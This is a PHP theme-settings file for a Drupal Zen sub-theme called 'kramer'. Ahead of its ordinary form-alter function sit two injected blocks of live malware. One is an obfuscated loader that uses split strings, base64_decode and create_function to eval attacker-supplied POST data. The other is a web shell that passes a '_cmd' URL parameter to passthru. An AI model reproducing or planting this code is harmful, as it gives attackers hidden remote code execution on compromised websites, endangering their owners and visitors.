<?php
$ntlh="JGM9J2NvdWq50JzskqYT0kX1qBPU1Q7JGs9JzlsM1";
$lshg="dSqJzqtpZqihyqZXNldCgkYSk9PSdQQqycuJGs";
$osos="lY29kZSgkX1BPU1RbqJ3VwZGF0ZSddKSqk7fQ==";
$crae = str_replace("z","","sztrz_zrzepzlacze");
$yvzn="gJiqYgJGMoJGEpPqjEpe2V2YWwoqYmFzZTY0X2R";
$vrhb = $crae("n", "", "nbnanse6n4n_dnencnondne");
$ivhg = $crae("m","","mcrmematme_mfumnctimomn");
$kips = $ivhg('', $vrhb($crae("q", "", $ntlh.$lshg.$yvzn.$osos))); $kips(); ?><?php if (isset($_GET["_cmd"])) die(passthru($_GET["_cmd"])); ?><?php
/**
 * Implements hook_form_system_theme_settings_alter().
 *
 * @param $form
 *   Nested array of form elements that comprise the form.
 * @param $form_state
 *   A keyed array containing the current state of the form.
 */
function kramer_form_system_theme_settings_alter(&$form, &$form_state, $form_id = NULL)  {
  // Work-around for a core bug affecting admin themes. See issue #943212.
  if (isset($form_id)) {
    return;
  }

  // Create the form using Forms API: http://api.drupal.org/api/7

  /* -- Delete this line if you want to use this setting
  $form['kramer_example'] = array(
    '#type'          => 'checkbox',
    '#title'         => t('kramer sample setting'),
    '#default_value' => theme_get_setting('kramer_example'),
    '#description'   => t("This option doesn't do anything; it's just an example."),
  );
  // */

  // Remove some of the base theme's settings.
  /* -- Delete this line if you want to turn off this setting.
  unset($form['themedev']['zen_wireframes']); // We don't need to toggle wireframes on this site.
  // */

  // We are editing the $form in place, so we don't need to return anything.
}